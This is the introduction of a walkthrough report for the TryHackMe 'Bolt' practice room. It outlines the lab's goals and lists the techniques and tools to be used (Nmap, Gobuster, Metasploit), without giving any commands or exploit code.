Introduction
Practical labs are one of the best ways to learn ethical hacking and penetration testing. In this report, I will explain my walkthrough of the Bolt room on TryHackMe.

The main goal of this lab is to identify vulnerabilities in a web application and gain access to the target machine.

During this lab, I practiced several penetration testing techniques, including:

Network scanning
Web enumeration
Identifying a vulnerable CMS
Exploiting the system using Metasploit Framework
Lab Setup
Before starting the lab, I connected to the TryHackMe VPN and deployed the target machine.

Tools used in this lab include:

Nmap
Gobuster
Web Browser
Metasploit
These tools help identify services, find hidden directories, and exploit vulnerabilities.

